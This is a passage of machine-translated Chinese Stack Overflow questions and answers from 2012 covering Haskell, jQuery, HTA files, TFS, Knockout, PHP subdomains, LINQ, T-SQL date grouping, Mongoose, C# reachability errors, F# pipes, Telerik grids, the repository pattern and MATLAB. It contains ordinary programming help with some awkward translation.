也可以使用`encode()`方法转换为字节 fromat。

# haskell - 从列表中删除所有实例

> ID：10114228
> 
> 赞同：3
> 
> 时间：2012-04-11T21:25:25.013
> 
> 标签：haskell, recursion, functional-programming

我正在尝试使用haskell删除列表中某个项目的所有实例。我收到一个我不太明白的错误。谁能帮助我，让我知道我是否做对了？

```
deleteAllInstances :: (a, [l]) =>  a -> [l] -> [l]
deleteAllInstances (a, []) = []
deleteAllInstances (i, (x:xs))
    | i == x = tail
    | otherwise = x ++ tail
    where tail = deleteAllInstances i xs 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-11T21:32:25.657

首先，类型签名格式错误。

```
deleteAllInstances :: (a, [l]) =>  a -> [l] -> [l] 
```

类型签名具有以下形式

```
name :: (Constraints) => type 
```

其中`Constraints`涉及类型类，例如`(Ord a, Show a)`. 在这种情况下，该函数使用`(==)`，因此必须有一个形式的约束`Eq a`。

然后函数定义与类型部分不匹配，您将其定义为将一对作为参数，而类型签名则另有说明（您的定义是非柯里化的，类型是柯里化的）。

```
deleteAllInstances (a, []) = []
deleteAllInstances (i, (x:xs))
    | i == x = tail
    | otherwise = x ++ tail
    where tail = deleteAllInstances i xs 
```

然后你使用`(++)`将一个元素粘合到列表的前面，但`(++)`连接两个列表，你需要`(:)`在这里。

定义函数的最简单方法是使用`filter`

```
deleteAllInstances :: Eq a => a -> [a] -> [a]
deleteAllInstances a xs = filter (/= a) xs 
```

但是如果你想自己进行显式递归，

```
deleteAllInstances :: Eq a => a -> [a] -> [a]
deleteAllInstances a (x:xs)
    | a == x    = rest
    | otherwise = x : rest
      where
        rest = deleteAllInstances a xs
deleteAllInstances _ _ = [] 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-11T21:31:10.893

我不确定您要对`(a, [l])`before做`=>`什么，但我认为没有必要。语法通常保留用于指定 a 和 l 应该满足的类型。

此外，您的函数需要两个参数，`a`和`[l]`，正如您稍后在函数定义中指定的那样。但是，您的函数实现只需要一个参数，一个元组。正如我之前提到的，元组仅用于指定参数应该是什么类型，并且不能进行模式匹配。

```
deleteAllInstances :: a -> [l] -> [l]
deleteAllInstances a [] = []
deleteAllInstances i (x:xs)
    | i == x = rest
    | otherwise = x : rest
    where rest = deleteAllInstances i xs 
```

如果您想使用 编写它`filter`，您可以随时使用以下代码

```
deleteAllInstances :: a -> [a] -> [a]
deleteAllInstances a = filter (/=a) 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-06-16T03:17:04.067

实际上，我发现列表推导是解决此类问题的一种非常直观的表示法：

```
deleteAllInstances :: Eq a => a -> [a] -> [a]
deleteAllInstances a list = [x | x <- list, x /= a] 
```

# jquery - 是否有内置的 jquery 方法可以在页面中打开弹出窗口？

> ID：10114229
> 
> 赞同：-3
> 
> 时间：2012-04-11T21:25:25.570
> 
> 标签：jquery, popup

而不是打开一个新的弹出窗口，我想显示一个“伪弹出窗口”，我将页面的其余部分变灰并只显示 div，给用户一种弹出窗口的印象。

有很多关于如何做到这一点的例子。我想知道 jquery 库本身是否有我可以使用的东西（而不是下载其他第三方 javascript 库）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T21:28:34.773

如果你在谈论模态，有很多像： [http ://www.ericmmartin.com/projects/simplemodal/](http://www.ericmmartin.com/projects/simplemodal/)
[http://www.jacklmoore.com/colorbox](http://www.jacklmoore.com/colorbox)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T21:30:14.133

尽管有数百个插件，但 jQuery 核心中没有任何东西可以为您完成所有工作。

核心思想只是将 a 绝对定位`div`在页面的中间。

也许在它和页面之间（z-index-wise）有另一个，中间的有一些中间不透明度。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T21:28:39.460

这不是弹出窗口。这是一个模态对话框仿真。您可以为此使用 ColorBox：[http ://www.jacklmoore.com/colorbox](http://www.jacklmoore.com/colorbox)

# javascript - 如何建立直接链接以执行 .hta 文件？

> ID：10114235
> 
> 赞同：0
> 
> 时间：2012-04-11T21:25:47.483
> 
> 标签：javascript, windows, browser, hta

我在映射驱动器上有一个 .hta 文件，我可以手动导航到该文件，双击 .hta 文件即可正常执行。但是，我添加了一个指向共享上完整路径的链接（来自 IE 8 页面），当我尝试从该链接运行它时，如下所示：

问：\路径...\.hta

然后我收到一个javascript错误，运行脚本“长度为空或不是对象”时发生错误。javascript 代码来自此行的 .hta 文件本身：

```
...
for (var i = 0; i < matches.length; i++) { 
... 
```

我猜测由于某种原因，当 .hta 脱离链接而不是手动运行时，“i”没有被初始化。

无论如何，当我尝试从链接直接转到文件时，我会收到一个对话框，询问我是否要运行、保存或取消 .hta 文件。当我尝试运行它时，我得到了 javascript 错误。

所以我的问题是：

1.  如何从浏览器链接运行此 .hta 文件？
2.  为什么从链接运行而不是手动运行时会出现 javascript 错误？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-12T11:56:24.787

HTA 无法识别映射驱动器。

我假设您将应用程序保存在服务器上，然后在工作站上运行它，您将这个映射的驱动程序`Q`作为服务器的快捷方式。

服务器的正确路径是这样的：

```
//Your_Server_Name/path_in_server/file.hta 
```

也可以使用实际 IP 代替`Your_Server_Name`.

要在没有提示的情况下在浏览器（仅限 IE）中运行 HTA，您需要将 Intranet 区域安全和高级选项卡中的许多设置更改为非常不安全的模式。

关于错误信息：

似乎，它`matches`没有一个名为`length`. 如果`matches`定义了，它可能是一个数字或一个布尔值，或者一些其他类型的没有该`length`属性的对象。

如果消息是这样的：`Can't get the property length: object is null or not defined`. 这意味着，那`matches`是未定义的。

注意，HTA 是一个拥有自己的独立应用程序，`top.window`它不能与浏览器窗口交互。`opener`（如果打开器是浏览器窗口，则无法在 HTA 中引用。）

# .net - 在 TeamBuild 2010 中，是否可以在 .NET/VB6 构建环境中进行门控签入？

> ID：10114238
> 
> 赞同：0
> 
> 时间：2012-04-11T21:25:59.430
> 
> 标签：.net, vb6, tfs, tfsbuild

我有兴趣在我的构建过程中使用 Gated Checkins，但是我有 .NET 代码和 VB6 代码。门控签到可以同时使用这两组代码吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-12T02:59:33.310

是的，一点没错。您将需要自定义构建过程模板以适当地调用 VB6 编译器而不是 MSBuild，但您可以在 TFS 中的 Gated Check-In 构建中执行几乎任何您想做的事情。您定义“成功”的实际含义。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-30T11:29:51.360

是的，您需要在构建服务器上安装 VB6，然后修改其中一个 xaml 模板或将您自己的 msbuild 文件（由您的构建定义调用）添加到您的源中，该文件从[http://msbuildextensionpack调用类似 VB6task 的东西.codeplex.com/documentation](http://msbuildextensionpack.codeplex.com/documentation)或通过这样的 Exec 任务：

`<Exec WorkingDirectory="$(MSBuildProjectDirectory)\VB6zzzz" Command='"C:\Program Files\Microsoft Visual Studio\VB98\VB6.exe" /make zzz.vbp /d composer=0:ADO=1 /outdir "$(MSBuildProjectDirectory)\..\Binaries" /out $(MakeLog)' ContinueOnError="false" />`

# javascript - Knockoutjs：同时使用单击和检查绑定时的绑定评估顺序

> ID：10114239
> 
> 赞同：4
> 
> 时间：2012-04-11T21:26:01.690
> 
> 标签：javascript, binding, mvvm, knockout.js

我不知道如何访问已通过与绑定`checked`关联的方法中的`click`绑定更新的值？

似乎`checked`绑定在绑定之后评估`click`，因为在`click`绑定方法/处理程序中我无法访问`computed`依赖于与`checked`绑定同步的数组的属性值。

单个复选框的模板：

```
<script id="singleFilterTemplate" type="text/html">
    <li>
        <input type="checkbox" data-bind="attr: { value: id }, 
                                          click: $root.testMethod,
                                          checked: $parent.selectedFilterIds">
    </li>
</script> 
```

我遵循视图模型的层次结构：

```
- TopLevelViewModel ($root in template above, defines computed aggregatedSelectedIds property)
---- GroupViewModel_0 ($parent in template above)
-------FilterViewModel_0_0 (Each FilterViewModel is associated with a check box)
-------FilterViewModel_0_N 
---- GroupViewModel_N
-------FilterViewModel_N_0 
-------FilterViewModel_N_N 
```

*   `checked: $parent.selectedFilterIds`：每次选中/取消选中复选框时 -`TopLevelViewModel.selectedFilterIds`数组中的相应项目都会更新
*   `click: $root.testMethod`：在单击复选框时，我试图获取所有复选框的当前状态，为此我引入了计算属性`aggregatedSelectedIds`，该属性运行良好并表示所有`GroupViewModel.selectedFilterIds`值的聚合状态，基本上它聚合了所有`selectedFilterIds`属性的元数据成单个值，`testMethod()`我只是在调用`alert(topLevelViewModel.aggregatedSelectedIds())`以确保此属性表示当前选定过滤器的列表。

所以每次`testMethod()`通过绑定调用`click`- 我看到过滤器的先前状态（值，由 计算`aggregatedSelectedIds`）。那么有没有办法在`checked`绑定之前强制/推送/评估`click`绑定？我尝试`event`了绑定，但得到了相同的结果。也许我以错误的方式这样做并且错过了一些明显的东西？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-12T11:48:22.507

您可以通过执行订阅对 selectedFilterIds 的更改

```
this.selectedFilterIds  = ko.observable();
this.selectedFilterIds.subscribe(function (value) {
    //Code from your click method goes here
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T21:30:49.890

由于选中复选框将基本上同时触发选中事件和单击事件，因此浏览器只是决定首先触发其中一个处理程序，因此一个简单的解决方法是在单击处理程序中使用超时。

类似的东西`setTimeout(function() { stuff }, 1)`应该可以工作。

把它放在你的点击处理程序中会“跳”出处理程序，让检查的处理程序触发并执行，然后它会返回到你的超时回调中的代码（如果你的检查处理程序足够快可以完成，则在等待 1ms 之后在此之前，我对此表示怀疑）

即使检查的处理程序首先在其他浏览器中触发，这个解决方案仍然可以正常工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T21:28:27.187

通常，方法会按照您好的顺序进行绑定和执行。绑定它们。看起来您首先绑定的是单击。不确定从 data-bind attr 中的 knockoutjs 是如何处理这个问题的？

例如

```
$(this).click(function () { alert(1);})
    .click(function() {alert(2);});

// alert(1) is first 
```

我意识到那是 jquery，但纯 js 中的事件绑定也是如此。

真正做到这一点的最好方法是延迟或承诺，但我不知道这在 knockoutjs 中是如何工作的 :(

# php - Web 应用程序：通配符子域和自定义域

> ID：10114240
> 
> 赞同：0
> 
> 时间：2012-04-11T21:26:23.950
> 
> 标签：php, codeigniter, web-applications, cname, wildcard-subdomain

我有一个基于 Codeigniter 的网络应用程序，一切正常。当用户注册时，他会得到一个动态的用户名：username.domain.com。

我有通配符工作，一切都很好，除了。当他们自定义域名时，例如 userdomain.com。这是通过指向 username.domain.com 的 CNAME 完成的。

我正在使用 php 从 sudomain 中提取用户名：

```
define('DOMAIN', 'domain.com');

$subdomain = str_replace('.' . DOMAIN, '', $_SERVER['HTTP_HOST']);

if (!empty($subdomain) && $subdomain != 'www' && $subdomain != DOMAIN)
{
    define('SUBDOMAIN',$subdomain);
}
else
{
    define('SUBDOMAIN',NULL);
} 
```

使用自定义域我无法获得用户名。

对此有什么想法吗？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T21:28:41.573

您最好的选择可能是将自定义域映射到数据库中的用户名。

# c# - 使用 LINQ 将列表投影到键/计数二维数组

> ID：10114255
> 
> 赞同：2
> 
> 时间：2012-04-11T21:27:31.637
> 
> 标签：c#, arrays, json, linq, projection

假设我有一个这样的对象列表：

```
var users = new List<User>();
users.Add(new User() { FirstName = "Ek0nomik" });
users.Add(new User() { FirstName = "Ek0nomik" });
users.Add(new User() { FirstName = "Foobar" }); 
```

我正在尝试从该列表中获取一个二维数组，其中包含该名称的名称和该名称的计数（为了将其作为 JSON 返回并在 Google Charts 中使用）。这是数组将包含的内容：

```
["Ek0nomik", 2],
["Foobar", 1] 
```

我最初试图用来`.Select`投影一个新对象，但该项目针对列表中的每个对象，所以我认为该方法不会让我到达那里。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-11T21:31:04.503

```
users.GroupBy(x => x.FirstName)
     .Select(x => new { Name = x.Key, Count = x.Count() }) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T21:36:57.253

那这个呢？

```
var asd = users.GroupBy(x => x.FirstName).Select(x => new {Name = "['" + x.Key + "', "+ x.Count() + "]"});
foreach (var t in asd)
{
Console.WriteLine(t.Name);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T22:34:48.140

```
var groupedUsers = users.GroupBy(x => x.FirstName)
            .Select(x => new { Name = x.Key, Count = x.Count() });
var dictionary = groupedUsers.ToDictionary(u=>u.Name, u=>u.Count);

var serializer = new System.Web.Script.Serialization.JavaScriptSerializer();
var output = serializer.Serialize(dictionary); 
```

输出看起来

```
{"Ek0nomik":2,"Foobar":1} 
```

并用 JSON绘制[图表。](https://stackoverflow.com/questions/7068349/draw-google-charts-with-json)

如果您使用的是页面方法或 WebService，则不需要带有 JavaScriptSerializer 的行，只需要生成该 JSON 的字典。

# sql-server - 根据日期范围选择最大数量的记录。（彼此的日期在 6 个月内）

> ID：10114256
> 
> 赞同：3
> 
> 时间：2012-04-11T21:27:38.873
> 
> 标签：sql-server, tsql, sql-server-2005

我有一个日期列表。

我需要能够选择彼此 6 个月内最多的记录。

然后是下一个最大数量的记录，依此类推，直到所有记录都被选中。

这是数据

```
1  19-Oct-2007
2  03-Dec-2007
3  16-Oct-2009
4  26-Oct-2009
5  30-Oct-2009
6  01-Nov-2009
7  16-Nov-2009
8  30-Nov-2009
9  11-Dec-2009
10  25-Dec-2009
11  01-Jan-2010
12  21-Jan-2010
13  27-Jan-2010
14  28-Jan-2010
15  28-Jan-2010
16  12-Feb-2010
17  12-Feb-2010
18  27-Feb-2010
19  09-Mar-2010
20  22-Mar-2010
21  26-Mar-2010
22  01-Apr-2010
23  22-Oct-2010
24  15-Oct-2011
25  18-Oct-2011
26  26-Oct-2011
27  16-Nov-2011
28  18-Nov-2011
29  19-Nov-2011
30  26-Nov-2011
31  29-Nov-2011
32  29-Nov-2011
33  30-Nov-2011
34  06-Dec-2011
35  16-Dec-2011
36  17-Dec-2011
37  20-Dec-2011
38  28-Dec-2011
39  01-Jan-2012
40  01-Jan-2012
41  09-Jan-2012
42  13-Jan-2012
43  27-Jan-2012
44  01-Feb-2012
45  23-Feb-2012
46  29-Feb-2012
47  01-Mar-2012
48  01-Mar-2012
49  01-Mar-2012
50  02-Mar-2012
51  04-Mar-2012
52  04-Mar-2012
53  05-Mar-2012
54  05-Mar-2012
55  17-Mar-2012
56  23-Mar-2012
57  24-Mar-2012
58  01-Apr-2012
59  03-Apr-2012
60  04-Apr-2012 
```

一种可能的解决方案是选择

*   记录 24-60（他们在 172 天内）
*   记录 23（其不在前/后日期的 6 个月内）
*   记录 3-22（他们在 167 天内）
*   记录 1-2 （他们在 45 天内彼此）

（我从最大的日期开始，向后选择。这可能不是最佳解决方案）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-12T11:11:23.017

以下是该问题的迭代方法，目前我没有比这更好的建议了。不过，它应该可以工作：

```
WITH ranked AS (
  SELECT *, rnk = ROW_NUMBER() OVER (ORDER BY Date DESC)
  FROM data
),
marked AS (
  SELECT
    rnk,
    Date,
    GroupDate = date
  FROM ranked
  WHERE rnk = 1
  UNION ALL
  SELECT
    r.rnk,
    r.Date,
    GroupDate = CASE
      WHEN m.GroupDate > DATEADD(MONTH, 6, r.Date) THEN r.Date
      ELSE m.GroupDate
    END
  FROM ranked r
  INNER JOIN marked m ON r.rnk = m.rnk + 1
)
SELECT
  MinDate     = MIN(Date),
  MaxDate     = MAX(Date),
  [RowCount]  = COUNT(*),
  RangeLength = DATEDIFF(DAY, MIN(Date), MAX(Date))
FROM marked
GROUP BY
  GroupDate
ORDER BY
  GroupDate 
```

那是，

1.  最后一个日期被用于范围检查和组标记。

2.  处理后续（之前）日期，直到遇到标记半年以上。

3.  找到的日期成为新的组标记，该过程从步骤 1 继续，直到没有更多行。

在继续迭代之前，对行进行排名。但是，如果您有一列保证包含唯一的连续值而没有间隙，您可以使用该列而不是排名数字。

以下是它为原始帖子中的示例提供的结果：

```
MinDate     MaxDate     RowCount     RangeLength
----------  ----------  -----------  -----------
2007-10-19  2007-12-03  2            45
2009-10-16  2010-04-01  20           167
2010-10-22  2010-10-22  1            0
2011-10-15  2012-04-04  37           172 
```

整个脚本，包括设置，都可以[在 SQL Fiddle 上](http://sqlfiddle.com/#!3/93bd8/4)找到并使用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-12T08:31:05.747

我使用了自己的测试数据，这是非常复杂的东西。使用光标可能更容易处理。但我不是游标的忠实粉丝。我已经尽力了：

```
declare @t table(record int, date datetime)
insert @t values(1,'19-Oct-2007'),
(2,'03-Dec-2007'),
(3,'2-may-2009'),
(4,'16-Oct-2009'),
(5,'26-Oct-2009'),
(6,'30-Oct-2009'),
(7,'01-Nov-2009'),
(8,'16-Nov-2009'),
(9,'30-Nov-2009'),
(10,'11-Dec-2009'),
(11,'11-Dec-2010'),
(12,'11-Dec-2010'),
(13,'11-Dec-2010')

;with a as
(
  select datediff(day, t1.date, t2.date) daysapart, 
  row_number() over (order by count desc) rn,
  b.count, 
         t1.record fromrecord, 
         t2.record torecord
  from @t t1
  join @t t2
  on t1.date <= t2.date 
     and dateadd(month, 6, t1.date) > t2.date 
     and t1.record <= t2.record
  cross apply (select count(*) count from @t where record between t1.record and t2.record) b
)
, b as
(
    select * from a where not exists 
    (select 1 from a b where (a.fromrecord between b.fromrecord and b.torecord
      or a.torecord between b.fromrecord and b.torecord)
      and a.rn > b.rn and not exists(select 1 from a c where 
      (b.fromrecord between c.fromrecord and c.torecord
      or b.torecord between c.fromrecord and c.torecord)
      and b.rn > c.rn))
)
select count, fromrecord, torecord, daysapart from b 
```

结果：

```
count       fromrecord  torecord    daysapart
----------- ----------- ----------- -----------
7           4           10          56
3           11          13          0
2           1           2           45
1           3           3           0 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-11T22:15:01.240

```
select d1.date, count(*)
from dates as d1 with (nolock) 
join dates as d2 with (nolock) 
on datediff(mm,d2.date,d1.date) < 6 
group by d1.date  
order by count(*) desc 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-12T05:36:35.237

我考虑过

1.  6 个月 = 180 天
2.  如果日期之间的差异 > 180 天，那么它们将在列表中出现。

尝试这个 ：

```
create table #list (id int, dt datetime  )
-- insert you data into #list

select s1.id as ID_1, s1.dt as Date_2 , s2.id as ID_2, s2.dt as Date_2 
,abs( datediff(day, s2.dt, s1.dt) ) diff_in_days
from #list s1 , #list s2 
order by  case when abs(datediff(day, s2.dt, s1.dt) ) > 180 then 1
else  abs(datediff(day, s2.dt, s1.dt)) end  desc 
```

# node.js - Mongoose：如何使用与数组中的一项匹配的数组值更新文档？

> ID：10114257
> 
> 赞同：4
> 
> 时间：2012-04-11T21:27:43.523
> 
> 标签：node.js, mongodb, mongoose

使用 Node.js、mongoDB、猫鼬：

我有一个数据库集合，其记录具有字符串数组字段。

我需要删除与传递的字符串匹配的所有记录的数组中的项目。

这涉及查找具有包含匹配项的数组的所有记录，从数组中拼接项目并将记录保存回数据库。

我正在努力弄清楚如何做到这一点。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-11T22:10:44.763

您应该可以使用 a`$pull`或 a来执行此操作`$pullAll`（如此处所述：www.mongodb.org/display/DOCS/Updating#Updating-%24pull）。例如，在外壳中：

```
> db.coll.update({}, {$pull : {arrField : passedString}}, false, true); 
```

如果存在，这将通过从 arrField 数组中提取传递的字符串来更新所有文档。（`false`为了不更新，`true`更新多个文档。）

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-12T07:22:09.350

你可以使用类似的东西

```
Model.update({}, {$pull : {arrField : passedString}}, function(){}) 
```

# c# - .NET 编译器和“并非所有代码路径都返回值”

> ID：10114258
> 
> 赞同：2
> 
> 时间：2012-04-11T21:27:57.460
> 
> 标签：c#, compiler-construction, compiler-errors

为什么在下面的代码中，.NET 编译器无法确定所有代码路径都返回一个值？

```
bool Test(bool param) {
    bool test = true;
    if (param)
        test = false;
    else
        test = false;
    if (!test)
        return false;
} 
```

错误 CS0161：并非所有代码路径都返回值！

代码可以重构——但编译器不建议这样做。然而所有的返回路径都被覆盖了——那么为什么编译器会抱怨它们没有呢？

编辑：我想这里的结论是：

```
(error CS0161) + (all code paths obviously return a value) => refactor code. 
```

一旦你养成了翻译的习惯，我想一切都好。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-04-11T21:41:01.923

来自 Visual Studio 2010 附带的 C# 语言规范 4.0。

> 10.6.10“方法体”：
> 
> 当方法的返回类型不是 void 时，该方法主体中的每个 return 语句都必须指定一个可隐式转换为返回类型的表达式。返回值的方法的方法体的端点不能到达。换句话说，在返回值的方法中，不允许控制从方法体的末尾流出。

*可达性*的定义在这里（强调添加）：

> 8.1 “端点和可达性”：
> 
> 如果一个语句有可能通过执行到达，则称该语句是可到达的。相反，如果一个语句不可能被执行，则该语句被称为不可达。
> 
> ...
> 
> 为了确定特定语句或端点是否可达，编译器根据为每个语句定义的可达性规则执行流分析。流分析考虑了控制语句行为的常量表达式（第 7.19 节）的值，但**不考虑非常量表达式的可能值**。

由于`!test`不是一个常量表达式（即使它总是计算为`true`），编译器有义务在流分析中不考虑它。这种限制的一个原因（可能是唯一的原因）是在一般情况下执行这种流量分析是不可能的。

要消除错误，您需要在子句中或在方法末尾无条件地添加另一个`return`语句。`else`

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-04-11T21:33:00.077

来自[Eric Lippert 的博客](http://blogs.msdn.com/b/ericlippert/archive/2009/08/13/four-switch-oddities.aspx)：

> 可达性分析器不是很聪明。它没有意识到只有两种可能的控制流，并且我们已经用返回覆盖了所有它们。

^(（博客文章是关于`switch`语句的，但我猜可达性分析器对于`if`语句来说并没有那么聪明。）)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-11T21:31:08.497

这只是表示编译器在初始化什么以及将执行哪些行方面的智能限制。

我不时遇到这种情况。但很少有问题。我通常会稍微重构一下代码。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-11T21:46:47.603

让我们向后分析代码：

***问题：**代码不返回任何值。*

**问题：**在代码中的哪个位置返回值？

**答：**就在最后一行。

**结论：**所以那行代码（最后一行）应该总是返回一个值。

**问题：**最后一行是否总是返回一个值？

**回答：**不，只有在第一行设置为`test`is时才返回值。`false``true`

**结论：**正如编译器所说，这个函数在它应该返回时从不返回值`bool`。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2018-08-14T12:36:24.457

让我直接回答您的问题，而不是详细说明。

1.  函数的返回类型指定为**Bool** ，因此该函数必须返回 True 或 false
2.  **Param**已被定义为输入参数，因此在编译时无法确定其值
3.  **测试**变量的值取决于参数，根据步骤 2，**参数**值无法在编译时确定，因此**测试**值无法在编译时确定
4.  **由于 test 的值不称为编译时间（根据步骤 3），因此它开始为if (!test)**寻找 else / default 根，因此它会引发错误。

谢谢

# f# - F# 将四元组传递给函数

> ID：10114259
> 
> 赞同：4
> 
> 时间：2012-04-11T21:28:00.060
> 
> 标签：f#

元组通过以下方式传递：

```
let a = (1,2)
let f a b = ()
a ||> f 
```

三元组由以下管道传输：

```
let a = (1,2,3)
let f a b c = ()
a |||> f 
```

但这不适用于四倍：

```
let a = (1,2,3,4)
let f a b c d= ()
a ||||> f 
```

你如何通过管道将四元组传递给函数？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-04-11T21:32:01.863

其他由 F# 定义，对于 4 元组，您需要自己定义：

```
let a = (1,2,3,4)
let f a b c d = printfn "got %A %A %A %A" a b c d

let inline (||||>) (a,b,c,d) f = f a b c d

a ||||> f 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-11T21:44:15.957

你可以用无聊的方式来做，或者......

```
let a = (1,2,3,4)
let f a b c d = ()
let g = OptimizedClosures.FSharpFunc<_,_,_,_,_>.Adapt(f)
a |> g.Invoke 
```

# jquery - 在 Telerik MVC 中通过 JQuery 更改 Ajax 数据绑定参数？

> ID：10114261
> 
> 赞同：0
> 
> 时间：2012-04-11T21:28:05.620
> 
> 标签：jquery, ajax, asp.net-mvc, telerik

我目前正在使用 Telerik MVC，我想在选项卡中显示 Master/Detail 页面。

一般来说，Detail页面是ajax数据绑定，需要ID来检索数据。所以很明显，我必须配置 ajax 数据绑定。

这是JQuery。

```
Query('#PricingMatrix').tGrid({
    columns:[
        {"title":"Price Group","member":"PriceGroup","type":"String"},
        {"title":"Qty","member":"Qty","type":"String"},
        {"title":"Amount","member":"Amount","type":"String"},
        {"title":"Caculate Type","member":"CaculateType","type":"String"}
    ], 
    total:0, 
    currentPage:1, 
    pageSizesInDropDown:["5","10","20","50"], 
    pageOnScroll:false, 
    ajax:{
        "selectUrl":"/Home/_SelectionClientSide_PricingMatrix?ProductVariantsID=B02D7C9E-9101-444D-9112-007BC9D6E489"
    }, 
```

`ajax:"selectUrl":"/Home/_SelectionClientSide_PricingMatrix?ProductVariantsID=' '"`我怎么能通过 JQuery修改它。

非常感谢您的帮助，非常感谢。

# c# - 存储库模式以及如何管理实体之间的依赖关系

> ID：10114264
> 
> 赞同：1
> 
> 时间：2012-04-11T21:28:27.863
> 
> 标签：c#, database, repository, design-patterns

假设我有一个包含员工和部门的数据库。我创建了一个简单的对象模型来处理这个：

```
class Employee
{
   decimal Salary;
   Department Department;
}

class Department
{     
    decimal TotalSalaries; //calculated as the sum of all employees salaries
                           //stored in database, not just a C# property
} 
```

和..

```
class Employees
{
    void Create(Employee e);
    void Update(Employee e);    
    void Delete(Employee e);
    ...
}

class Departments
{
    ...
} 
```

如果我想更新员工，我会简单地做：

```
Employee emp = Employees.GetById(1);
emp.Salary += 100; //salary increase
Employees.Update(emp); 
```

**我希望每次更新其中一名员工`TotalSalaries`时自动重新计算`Department``Salary`**

我可以执行以下操作：

```
void Update(Employee e)
{
     ... //
     ... // sql stuff to update employee fields.

     Departments.ReCalculateTotalSalaries(e.Department.Id);
} 
```

但如果我这样做，我认为我违反了单一责任原则。为什么员工更新方法要关心`Departments`？这是一个非常简单的例子，但是如果我在实体之间有很多依赖关系，代码可能会变得非常混乱。

我已经考虑过其他方法来做到这一点：

1) 为 Employee 创建一个服务类：`EmployeeService`。然后在这个类中，定义一个`Update()`更新员工的方法。该方法将更新员工并重新计算部门总数（当然通过调用存储库方法）。

```
void Update(Employee e)
{
     Employees.Update(e);
     Departments.ReCalculateTotalSalaries(e.Department.Id);
} 
```

问题：如果我的数据模型中有很多依赖项，我几乎必须将模型层“加倍”（类数 x2）。另外：我如何确定控制器（或视图）将始终调用服务方法，而不是直接调用存储库？

* * *

2）在`Employees`存储库中有一个事件，从方法`OnSalaryChange()`调用。`Update()`存储库`Departments`将订阅它并在需要时执行必要的操作（换句话说：调用`ReCalculateTotalSalaries()`）。那么，属于什么的`Departments`留在`Departments`，`Employees`repository就不用关心其他实体了。

问题：当工资发生变化时（如果有多个订阅者），可能很难理解（通过阅读代码或在调试模式下）发生了什么。如果需要按特定顺序调用订阅者，这也可能成为问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T21:40:51.113

您应该有理由在数据库中拥有一个计算字段（性能？）。我尽量避免这种情况。

*原因更新不是唯一的情况*：如果你删除一个员工，你也必须重新计算。

但这可能很危险（出于一个原因，您有一天在数据库中使用脚本并忘记在更新员工工资后手动更新您的部门表？）

所以

*   你可以在你的数据库中创建一个触发器（如果你首先有代码，你总是可以使用 SMO 来保持“代码”逻辑）

*   你可以创建一个数据库视图

*   您可以在您的部门实体中拥有一个员工 ICollection（或 IList，或...），并以“简单获取属性”的形式获得总薪水，它将列表的薪水相加......

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T21:42:10.257

就你而言，是的，你打破了单一责任原则。

为了尊重原则，这条线

```
Departements.ReCalculateTotalSalaries(e.Department.Id); 
```

应该

```
e.Department.ReCalculateTotalSalaries(); 
```

为此，您必须在数据库和数据库模式中使用两个实体之间的关系。

**编辑：**请注意，ReCalculateTotalSalaries 应该修改属性，但不应该将自身保存在数据库中。因此，因为它不接触数据库本身，所以它应该放在您的部门实体中，而不是放在您的 DepartmentRepository 中

**EDIT2：**当您调用时`Employees.Update(yourEmployee)`，它还会保存 yourEmployee.Department。这就是它的魔力！无需`Update()`为每个实体调用一个！

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-04-11T21:40:03.327

为什么不只是构造函数将其他存储库注入（或其他类型）到员工存储库中？

```
public EmployeeRepository(DepartmentRepository department){} 
```

...然后将 _department 用于您需要的任何内容。这是一种干净的方式。您无法避免在代码中进行复杂的交互。

...或者使用一个“监督”存储库，将两者结合起来 - 并为两者注入引用 - 并且首先是 Employee 的事情，然后调用另一个？也许这更像你的想法。
MasterRepository(Employee employee, Department department)... SaveEmployee() { // 先做员工，然后... // 调用部门 }

希望这会有所帮助。

编辑：我不会参加这些事件 - 至少对于存储库来说，这是有原因的，但首先是它对 Db 和数据所在的位置感觉并不好。我不明白的第一个选项可能类似于我的主仓库。

# matlab - 适用于不同数组元素的代码向量化？

> ID：10114265
> 
> 赞同：0
> 
> 时间：2012-04-11T21:28:30.957
> 
> 标签：matlab, loops, vectorization

刚开始用matlab和向量化，FF到问题：

该怎么办：

```
%n,t are vectors(1D arrays) EDIT: these are column vectors.
k=9;
i=1;
kv = 0.6*k:0.2*k:1.4*k;
[zs,zb] = size(k);
error1 = zeros(zs,1);
for k2 = kv
error1(i,1) = error_km(n,t,kv(i));
i= i+1;
end 
```

其中 error_km 是：（n 和 t 大小相同）

```
function [ returnV] = error_km( n,t,k )
returnV = 0
    [a,b] = size(n);
    Nt = zeros();
    for i=2:a
